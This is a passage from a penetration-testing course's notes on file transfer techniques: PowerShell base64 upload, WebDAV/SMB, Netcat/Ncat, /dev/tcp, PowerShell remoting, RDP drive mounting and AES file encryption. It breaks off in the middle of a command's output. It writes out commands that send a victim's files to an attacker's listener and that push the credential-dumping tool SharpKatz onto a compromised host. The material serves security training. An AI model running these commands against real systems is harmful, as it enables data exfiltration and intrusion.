<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\htb</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$b64</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">((</span><span class="n">Get-Content</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s1">'C:\Windows\System32\drivers\etc\hosts'</span><span class="w"> </span><span class="nt">-Encoding</span><span class="w"> </span><span class="nx">Byte</span><span class="p">))</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\htb</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nx">http://192.168.49.128:8000/</span><span class="w"> </span><span class="nt">-Method</span><span class="w"> </span><span class="nx">POST</span><span class="w"> </span><span class="nt">-Body</span><span class="w"> </span><span class="nv">$b64</span><span class="w">
</span></code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>nc <span class="nt">-lvnp</span> 8000

listening on <span class="o">[</span>any] 8000 ...
connect to <span class="o">[</span>192.168.49.128] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.49.129] 50923
POST / HTTP/1.1
User-Agent: Mozilla/5.0 <span class="o">(</span>Windows NT<span class="p">;</span> Windows NT 10.0<span class="p">;</span> en-US<span class="o">)</span> WindowsPowerShell/5.1.19041.1682
Content-Type: application/x-www-form-urlencoded
Host: 192.168.49.128:8000
Content-Length: 1820
Connection: Keep-Alive

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQo
...SNIP...
</code></pre></div></div>

<h2 id="smb-uploads">SMB Uploads</h2>

<p>We previously discussed that companies usually allow outbound traffic using <code class="language-plaintext highlighter-rouge">HTTP</code> (TCP/80) and <code class="language-plaintext highlighter-rouge">HTTPS</code> (TCP/443) protocols. Commonly enterprises don’t allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks. For more information on this, we can read the Microsoft post <a href="https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a">Preventing SMB traffic from lateral connections and entering or leaving the network</a>.</p>

<p>An alternative is to run SMB over HTTP with <code class="language-plaintext highlighter-rouge">WebDav</code>. <code class="language-plaintext highlighter-rouge">WebDAV</code> <a href="https://datatracker.ietf.org/doc/html/rfc4918">(RFC 4918)</a> is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The <code class="language-plaintext highlighter-rouge">WebDAV</code> protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. <code class="language-plaintext highlighter-rouge">WebDAV</code> can also use HTTPS.</p>

<h4 id="configuring-webdav-server">Configuring WebDav Server</h4>

<p>To set up our WebDav server, we need to install two Python modules, <code class="language-plaintext highlighter-rouge">wsgidav</code> and <code class="language-plaintext highlighter-rouge">cheroot</code> (you can read more about this implementation here: <a href="https://github.com/mar10/wsgidav">wsgidav github</a>). After installing them, we run the <code class="language-plaintext highlighter-rouge">wsgidav</code> application in the target directory.</p>

<h4 id="installing-webdav-python-modules">Installing WebDav Python modules</h4>

<p>Windows File Transfer Methods</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">sudo </span>pip3 <span class="nb">install </span>wsgidav cheroot

<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>plaintext: 
Collecting wsgidav
  Downloading WsgiDAV-4.0.1-py3-none-any.whl <span class="o">(</span>171 kB<span class="o">)</span>
     |████████████████████████████████| 171 kB 1.4 MB/s
     ...SNIP...
</code></pre></div></div>

<h4 id="using-the-webdav-python-module">Using the WebDav Python module</h4>

<p>Windows File Transfer Methods</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">sudo </span>wsgidav <span class="nt">--host</span><span class="o">=</span>0.0.0.0 <span class="nt">--port</span><span class="o">=</span>80 <span class="nt">--root</span><span class="o">=</span>/tmp <span class="nt">--auth</span><span class="o">=</span>anonymous 

<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>plaintext: 
Running without configuration file.
10:02:53.949 - WARNING : App wsgidav.mw.cors.Cors<span class="o">(</span>None<span class="o">)</span>.is_disabled<span class="o">()</span> returned True: skipping.
10:02:53.950 - INFO    : WsgiDAV/4.0.1 Python/3.9.2 Linux-5.15.0-15parrot1-amd64-x86_64-with-glibc2.31
10:02:53.950 - INFO    : Lock manager:      LockManager<span class="o">(</span>LockStorageDict<span class="o">)</span>
10:02:53.950 - INFO    : Property manager:  None
10:02:53.950 - INFO    : Domain controller: SimpleDomainController<span class="o">()</span>
10:02:53.950 - INFO    : Registered DAV providers by route:
10:02:53.950 - INFO    :   - <span class="s1">'/:dir_browser'</span>: FilesystemProvider <span class="k">for </span>path <span class="s1">'/usr/local/lib/python3.9/dist-packages/wsgidav/dir_browser/htdocs'</span> <span class="o">(</span>Read-Only<span class="o">)</span> <span class="o">(</span>anonymous<span class="o">)</span>
10:02:53.950 - INFO    :   - <span class="s1">'/'</span>: FilesystemProvider <span class="k">for </span>path <span class="s1">'/tmp'</span> <span class="o">(</span>Read-Write<span class="o">)</span> <span class="o">(</span>anonymous<span class="o">)</span>
10:02:53.950 - WARNING : Basic authentication is enabled: It is highly recommended to <span class="nb">enable </span>SSL.
10:02:53.950 - WARNING : Share <span class="s1">'/'</span> will allow anonymous write access.
10:02:53.950 - WARNING : Share <span class="s1">'/:dir_browser'</span> will allow anonymous <span class="nb">read </span>access.
10:02:54.194 - INFO    : Running WsgiDAV/4.0.1 Cheroot/8.6.0 Python 3.9.2
10:02:54.194 - INFO    : Serving on http://0.0.0.0:80 ...
</code></pre></div></div>

<h4 id="connecting-to-the-webdav-share">Connecting to the Webdav Share</h4>

<p>Now we can attempt to connect to the share using the <code class="language-plaintext highlighter-rouge">DavWWWRoot</code> directory.</p>

<p>Windows File Transfer Methods</p>

<pre><code class="language-cmd">C:\htb&gt; dir \\192.168.49.128\DavWWWRoot

 Volume in drive \\192.168.49.128\DavWWWRoot has no label.
 Volume Serial Number is 0000-0000

 Directory of \\192.168.49.128\DavWWWRoot

05/18/2022  10:05 AM    &lt;DIR&gt;          .
05/18/2022  10:05 AM    &lt;DIR&gt;          ..
05/18/2022  10:05 AM    &lt;DIR&gt;          sharefolder
05/18/2022  10:05 AM                13 filetest.txt
               1 File(s)             13 bytes
               3 Dir(s)  43,443,318,784 bytes free
</code></pre>

<p><strong>Note:</strong> <code class="language-plaintext highlighter-rouge">DavWWWRoot</code> is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.</p>

<p>You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \192.168.49.128\sharefolder</p>

<h4 id="uploading-files-using-smb">Uploading Files using SMB</h4>

<p>Windows File Transfer Methods</p>

<pre><code class="language-cmd">C:\htb&gt; copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb&gt; copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
</code></pre>

<p><strong>Note:</strong> If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.</p>

<hr />

<h1 id="miscellaneous-file-transfer-methods">Miscellaneous File Transfer Methods</h1>

<p>We’ve covered various methods for transferring files on Windows and Linux. We also covered ways to achieve the same goal using different programming languages, but there are still many more methods and applications that we can use.</p>

<p>This section will cover alternative methods such as transferring files using <a href="https://en.wikipedia.org/wiki/Netcat">Netcat</a>, <a href="https://nmap.org/ncat/">Ncat</a> and using RDP and PowerShell sessions.</p>

<h2 id="netcat">Netcat</h2>

<p><a href="https://sectools.org/tool/netcat/">Netcat</a> (often abbreviated to <code class="language-plaintext highlighter-rouge">nc</code>) is a computer networking utility for reading from and writing to network connections using TCP or UDP, which means that we can use it for file transfer operations.</p>

<p>The original Netcat was <a href="http://seclists.org/bugtraq/1995/Oct/0028.html">released</a> by Hobbit in 1995, but it hasn’t been maintained despite its popularity. The flexibility and usefulness of this tool prompted the Nmap Project to produce <a href="https://nmap.org/ncat/">Ncat</a>, a modern reimplementation that supports SSL, IPv6, SOCKS and HTTP proxies, connection brokering, and more.</p>

<p>In this section, we will use both the original Netcat and Ncat.</p>

<p><strong>Note:</strong> <strong>Ncat</strong> is used in HackTheBox’s PwnBox as nc, ncat, and netcat.</p>

<h2 id="file-transfer-with-netcat-and-ncat">File Transfer with Netcat and Ncat</h2>

<p>The target or attacking machine can be used to initiate the connection, which is helpful if a firewall prevents access to the target. Let’s create an example and transfer a tool to our target.</p>

<p>In this example, we’ll transfer <a href="https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe">SharpKatz.exe</a> from our Pwnbox onto the compromised machine. We’ll do it using two methods. Let’s work through the first one.</p>

<p>We’ll first start Netcat (<code class="language-plaintext highlighter-rouge">nc</code>) on the compromised machine, listening with option <code class="language-plaintext highlighter-rouge">-l</code>, selecting the port to listen with the option <code class="language-plaintext highlighter-rouge">-p 8000</code>, and redirect the <a href="https://en.wikipedia.org/wiki/Standard_streams#Standard_input_\(stdin\)">stdout</a> using a single greater-than <code class="language-plaintext highlighter-rouge">&gt;</code> followed by the filename, <code class="language-plaintext highlighter-rouge">SharpKatz.exe</code>.</p>

<h4 id="netcat---compromised-machine---listening-on-port-8000">NetCat - Compromised Machine - Listening on Port 8000</h4>

<p>Miscellaneous File Transfer Methods</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">victim@target:~$</span><span class="w"> </span><span class="c"># Example using Original Netcat</span>
<span class="gp">victim@target:~$</span><span class="w"> </span>nc <span class="nt">-l</span> <span class="nt">-p</span> 8000 <span class="o">&gt;</span> SharpKatz.exe
</code></pre></div></div>

<p>If the compromised machine is using Ncat, we’ll need to specify <code class="language-plaintext highlighter-rouge">--recv-only</code> to close the connection once the file transfer is finished.</p>

<h4 id="ncat---compromised-machine---listening-on-port-8000">Ncat - Compromised Machine - Listening on Port 8000</h4>

<p>Miscellaneous File Transfer Methods</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">victim@target:~$</span><span class="w"> </span><span class="c"># Example using Ncat</span>
<span class="gp">victim@target:~$</span><span class="w"> </span>ncat <span class="nt">-l</span> <span class="nt">-p</span> 8000 <span class="nt">--recv-only</span> <span class="o">&gt;</span> SharpKatz.exe
</code></pre></div></div>

<p>From our attack host, we’ll connect to the compromised machine on port 8000 using Netcat and send the file <a href="https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe">SharpKatz.exe</a> as input to Netcat. The option <code class="language-plaintext highlighter-rouge">-q 0</code> will tell Netcat to close the connection once it finishes. That way, we’ll know when the file transfer was completed.</p>

<h4 id="netcat---attack-host---sending-file-to-compromised-machine">Netcat - Attack Host - Sending File to Compromised machine</h4>

<p>Miscellaneous File Transfer Methods</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">c0derpwner@htb[/htb]$</span><span class="w"> </span>wget <span class="nt">-q</span> https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
<span class="gp">c0derpwner@htb[/htb]$</span><span class="w"> </span><span class="c"># Example using Original Netcat</span>
<span class="gp">c0derpwner@htb[/htb]$</span><span class="w"> </span>nc <span class="nt">-q</span> 0 192.168.49.128 8000 &lt; SharpKatz.exe
</code></pre></div></div>

<p>By utilizing Ncat on our attacking host, we can opt for <code class="language-plaintext highlighter-rouge">--send-only</code> rather than <code class="language-plaintext highlighter-rouge">-q</code>. The <code class="language-plaintext highlighter-rouge">--send-only</code> flag, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted. Typically, Ncat would continue running until the network connection is closed, as the remote side may transmit additional data. However, with <code class="language-plaintext highlighter-rouge">--send-only</code>, there is no need to anticipate further incoming information.</p>

<h4 id="ncat---attack-host---sending-file-to-compromised-machine">Ncat - Attack Host - Sending File to Compromised machine</h4>

<p>Miscellaneous File Transfer Methods</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">c0derpwner@htb[/htb]$</span><span class="w"> </span>wget <span class="nt">-q</span> https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
<span class="gp">c0derpwner@htb[/htb]$</span><span class="w"> </span><span class="c"># Example using Ncat</span>
<span class="gp">c0derpwner@htb[/htb]$</span><span class="w"> </span>ncat <span class="nt">--send-only</span> 192.168.49.128 8000 &lt; SharpKatz.exe
</code></pre></div></div>

<p>Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there’s a firewall blocking inbound connections. Let’s listen on port 443 on our Pwnbox and send the file <a href="https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe">SharpKatz.exe</a> as input to Netcat.</p>

<h4 id="attack-host---sending-file-as-input-to-netcat">Attack Host - Sending File as Input to Netcat</h4>

<p>Miscellaneous File Transfer Methods</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">c0derpwner@htb[/htb]$</span><span class="w"> </span><span class="c"># Example using Original Netcat</span>
<span class="gp">c0derpwner@htb[/htb]$</span><span class="w"> </span><span class="nb">sudo </span>nc <span class="nt">-l</span> <span class="nt">-p</span> 443 <span class="nt">-q</span> 0 &lt; SharpKatz.exe
</code></pre></div></div>

<h4 id="compromised-machine-connect-to-netcat-to-receive-the-file">Compromised Machine Connect to Netcat to Receive the File</h4>

<p>Miscellaneous File Transfer Methods</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">victim@target:~$</span><span class="w"> </span><span class="c"># Example using Original Netcat</span>
<span class="gp">victim@target:~$</span><span class="w"> </span>nc 192.168.49.128 443 <span class="o">&gt;</span> SharpKatz.exe
</code></pre></div></div>

<p>Let’s do the same with Ncat:</p>

<h4 id="attack-host---sending-file-as-input-to-ncat">Attack Host - Sending File as Input to Ncat</h4>

<p>Miscellaneous File Transfer Methods</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">c0derpwner@htb[/htb]$</span><span class="w"> </span><span class="c"># Example using Ncat</span>
<span class="gp">c0derpwner@htb[/htb]$</span><span class="w"> </span><span class="nb">sudo </span>ncat <span class="nt">-l</span> <span class="nt">-p</span> 443 <span class="nt">--send-only</span> &lt; SharpKatz.exe
</code></pre></div></div>

<h4 id="compromised-machine-connect-to-ncat-to-receive-the-file">Compromised Machine Connect to Ncat to Receive the File</h4>

<p>Miscellaneous File Transfer Methods</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">victim@target:~$</span><span class="w"> </span><span class="c"># Example using Ncat</span>
<span class="gp">victim@target:~$</span><span class="w"> </span>ncat 192.168.49.128 443 <span class="nt">--recv-only</span> <span class="o">&gt;</span> SharpKatz.exe
</code></pre></div></div>

<p>If we don’t have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file <a href="https://tldp.org/LDP/abs/html/devref1.html">/dev/TCP/</a>.</p>

<p>Writing to this particular file makes Bash open a TCP connection to <code class="language-plaintext highlighter-rouge">host:port</code>, and this feature may be used for file transfers.</p>

<h4 id="netcat---sending-file-as-input-to-netcat">NetCat - Sending File as Input to Netcat</h4>

<p>Miscellaneous File Transfer Methods</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">c0derpwner@htb[/htb]$</span><span class="w"> </span><span class="c"># Example using Original Netcat</span>
<span class="gp">c0derpwner@htb[/htb]$</span><span class="w"> </span><span class="nb">sudo </span>nc <span class="nt">-l</span> <span class="nt">-p</span> 443 <span class="nt">-q</span> 0 &lt; SharpKatz.exe
</code></pre></div></div>

<h4 id="ncat---sending-file-as-input-to-ncat">Ncat - Sending File as Input to Ncat</h4>

<p>Miscellaneous File Transfer Methods</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">c0derpwner@htb[/htb]$</span><span class="w"> </span><span class="c"># Example using Ncat</span>
<span class="gp">c0derpwner@htb[/htb]$</span><span class="w"> </span><span class="nb">sudo </span>ncat <span class="nt">-l</span> <span class="nt">-p</span> 443 <span class="nt">--send-only</span> &lt; SharpKatz.exe
</code></pre></div></div>

<h4 id="compromised-machine-connecting-to-netcat-using-devtcp-to-receive-the-file">Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File</h4>

<p>Miscellaneous File Transfer Methods</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">victim@target:~$</span><span class="w"> </span><span class="nb">cat</span> &lt; /dev/tcp/192.168.49.128/443 <span class="o">&gt;</span> SharpKatz.exe
</code></pre></div></div>

<p><strong>Note:</strong> The same operation can be used to transfer files from the compromised host to our Pwnbox.</p>

<h2 id="powershell-session-file-transfer">PowerShell Session File Transfer</h2>

<p>We already talk about doing file transfers with PowerShell, but there may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that’s the case, we can use <a href="https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2">PowerShell Remoting</a>, aka WinRM, to perform file transfer operations.</p>

<p><a href="https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2">PowerShell Remoting</a> allows us to execute scripts or commands on a remote computer using PowerShell sessions. Administrators commonly use PowerShell Remoting to manage remote computers in a network, and we can also use it for file transfer operations. By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener. The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.</p>

<p>To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the <code class="language-plaintext highlighter-rouge">Remote Management Users</code> group, or have explicit permissions for PowerShell Remoting in the session configuration. Let’s create an example and transfer a file from <code class="language-plaintext highlighter-rouge">DC01</code> to <code class="language-plaintext highlighter-rouge">DATABASE01</code> and vice versa.</p>

<p>We have a session as <code class="language-plaintext highlighter-rouge">Administrator</code> in <code class="language-plaintext highlighter-rouge">DC01</code>, the user has administrative rights on <code class="language-plaintext highlighter-rouge">DATABASE01</code>, and PowerShell Remoting is enabled. Let’s use Test-NetConnection to confirm we can connect to WinRM.</p>

<h4 id="from-dc01---confirm-winrm-port-tcp-5985-is-open-on-database01">From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.</h4>

<p>Miscellaneous File Transfer Methods</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\htb</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">whoami</span><span class="w">

</span><span class="n">htb\administrator</span><span class="w">

</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\htb</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">hostname</span><span class="w">

</span><span class="n">DC01</span><span class="w">
</span></code></pre></div></div>

<p>Miscellaneous File Transfer Methods</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\htb</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Test-NetConnection</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">DATABASE01</span><span class="w"> </span><span class="nt">-Port</span><span class="w"> </span><span class="nx">5985</span><span class="w">

</span><span class="n">ComputerName</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="nx">DATABASE01</span><span class="w">
</span><span class="n">RemoteAddress</span><span class="w">    </span><span class="p">:</span><span class="w"> </span><span class="nx">192.168.1.101</span><span class="w">
</span><span class="n">RemotePort</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">5985</span><span class="w">
</span><span class="n">InterfaceAlias</span><span class="w">   </span><span class="p">:</span><span class="w"> </span><span class="nx">Ethernet0</span><span class="w">
</span><span class="n">SourceAddress</span><span class="w">    </span><span class="p">:</span><span class="w"> </span><span class="nx">192.168.1.100</span><span class="w">
</span><span class="n">TcpTestSucceeded</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">True</span><span class="w">
</span></code></pre></div></div>

<p>Because this session already has privileges over <code class="language-plaintext highlighter-rouge">DATABASE01</code>, we don’t need to specify credentials. In the example below, a session is created to the remote computer named <code class="language-plaintext highlighter-rouge">DATABASE01</code> and stores the results in the variable named <code class="language-plaintext highlighter-rouge">$Session</code>.</p>

<h4 id="create-a-powershell-remoting-session-to-database01">Create a PowerShell Remoting Session to DATABASE01</h4>

<p>Miscellaneous File Transfer Methods</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\htb</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$Session</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-PSSession</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">DATABASE01</span><span class="w">
</span></code></pre></div></div>

<p>We can use the <code class="language-plaintext highlighter-rouge">Copy-Item</code> cmdlet to copy a file from our local machine <code class="language-plaintext highlighter-rouge">DC01</code> to the <code class="language-plaintext highlighter-rouge">DATABASE01</code> session we have <code class="language-plaintext highlighter-rouge">$Session</code> or vice versa.</p>

<h4 id="copy-samplefiletxt-from-our-localhost-to-the-database01-session">Copy samplefile.txt from our Localhost to the DATABASE01 Session</h4>

<p>Miscellaneous File Transfer Methods</p>

<pre><code class="language-powershell-session">PS C:\htb&gt; Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
</code></pre>

<h4 id="copy-databasetxt-from-database01-session-to-our-localhost">Copy DATABASE.txt from DATABASE01 Session to our Localhost</h4>

<p>Miscellaneous File Transfer Methods</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\htb</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Copy-Item</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"C:\Users\Administrator\Desktop\DATABASE.txt"</span><span class="w"> </span><span class="nt">-Destination</span><span class="w"> </span><span class="nx">C:\</span><span class="w"> </span><span class="nt">-FromSession</span><span class="w"> </span><span class="nv">$Session</span><span class="w">
</span></code></pre></div></div>

<hr />

<h2 id="rdp-1">RDP</h2>

<p>RDP (Remote Desktop Protocol) is commonly used in Windows networks for remote access. We can transfer files using RDP by copying and pasting. We can right-click and copy a file from the Windows machine we connect to and paste it into the RDP session.</p>

<p>If we are connected from Linux, we can use <code class="language-plaintext highlighter-rouge">xfreerdp</code> or <code class="language-plaintext highlighter-rouge">rdesktop</code>. At the time of writing, <code class="language-plaintext highlighter-rouge">xfreerdp</code> and <code class="language-plaintext highlighter-rouge">rdesktop</code> allow copy from our target machine to the RDP session, but there may be scenarios where this may not work as expected.</p>

<p>As an alternative to copy and paste, we can mount a local resource on the target RDP server. <code class="language-plaintext highlighter-rouge">rdesktop</code> or <code class="language-plaintext highlighter-rouge">xfreerdp</code> can be used to expose a local folder in the remote RDP session.</p>

<h4 id="mounting-a-linux-folder-using-rdesktop">Mounting a Linux Folder Using rdesktop</h4>

<p>Miscellaneous File Transfer Methods</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>rdesktop 10.10.10.132 <span class="nt">-d</span> HTB <span class="nt">-u</span> administrator <span class="nt">-p</span> <span class="s1">'Password0@'</span> <span class="nt">-r</span> disk:linux<span class="o">=</span><span class="s1">'/home/user/rdesktop/files'</span>
</code></pre></div></div>

<h4 id="mounting-a-linux-folder-using-xfreerdp">Mounting a Linux Folder Using xfreerdp</h4>

<p>Miscellaneous File Transfer Methods</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:<span class="s1">'Password0@'</span> /drive:linux,/home/plaintext/htb/academy/filetransfer
</code></pre></div></div>

<p>To access the directory, we can connect to <code class="language-plaintext highlighter-rouge">\\tsclient\</code>, allowing us to transfer files to and from the RDP session.</p>

<p><img src="https://academy.hackthebox.com/storage/modules/24/tsclient.jpg" alt="Windows File Explorer showing a network folder named 'tsclient' with a subfolder 'linux'." /></p>

<p>Alternatively, from Windows, the native <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc">mstsc.exe</a> remote desktop client can be used.</p>

<p><img src="https://academy.hackthebox.com/storage/modules/24/rdp.png" alt="Remote Desktop Connection settings showing options for configuring remote audio, keyboard shortcuts, and local resources like printers and drives." /></p>

<p>After selecting the drive, we can interact with it in the remote session that follows.</p>

<p><strong>Note:</strong> This drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session.</p>

<hr />

<h1 id="protected-file-transfers">Protected File Transfers</h1>

<p>As penetration testers, we often gain access to highly sensitive data such as user lists, credentials (i.e., downloading the NTDS.dit file for offline password cracking), and enumeration data that can contain critical information about the organization’s network infrastructure, and Active Directory (AD) environment, etc. Therefore, it is essential to encrypt this data or use encrypted data connections such as SSH, SFTP, and HTTPS. Howe
ver, sometimes these options are not available to us, and a different approach is required.</p>

<h2 id="file-encryption-on-windows">File Encryption on Windows</h2>

<p>Many different methods can be used to encrypt files and information on Windows systems. One of the simplest methods is the <a href="https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1">Invoke-AESEncryption.ps1</a> PowerShell script. This script is small and provides encryption of files and strings.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="nf">EXAMPLE</span><span class="w">
</span><span class="n">Invoke-AESEncryption</span><span class="w"> </span><span class="nt">-Mode</span><span class="w"> </span><span class="nx">Encrypt</span><span class="w"> </span><span class="nt">-Key</span><span class="w"> </span><span class="s2">"p@ssw0rd"</span><span class="w"> </span><span class="nt">-Text</span><span class="w"> </span><span class="s2">"Secret Text"</span><span class="w"> 
</span></code></pre></div></div>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\htb</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\Invoke-AESEncryption.ps1</span><span class="w">
</span></code></pre></div></div>

<p>Command:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\htb</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Invoke-AESEncryption</span><span class="w"> </span><span class="nt">-Mode</span><span class="w"> </span><span class="nx">Encrypt</span><span class="w"> </span><span class="nt">-Key</span><span class="w"> </span><span class="s2">"p4ssw0rd"</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="o">.</span><span class="nx">\scan-results.txt</span><span class="w">

</span><span class="n">File</span><span class="w"> </span><span class="nx">encrypted</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">C:\htb\scan-results.txt.aes</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\htb</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ls</span><span class="w">

    </span><span class="n">Directory:</span><span class="w"> </span><span class="nx">C:\htb</span><span class="w">

</span><span class="n">Mode</span><span class="w">                 </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">
</span><span class="o">----</span><span class="w">                 </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">
</span><span class="nt">-a</span><span class="o">----</span><span class="w">        </span><span class="mi">11</span><span class="n">/18/2020</span><span class="w">  </span><span class="nx">12:17</span><span class="w"> </span><span class="nx">AM</span><span class="w">           </span><span class="nx">9734</span><span class="w"> </span><span class="nx">Invoke-AESEncryption.ps1</span><span class="w">
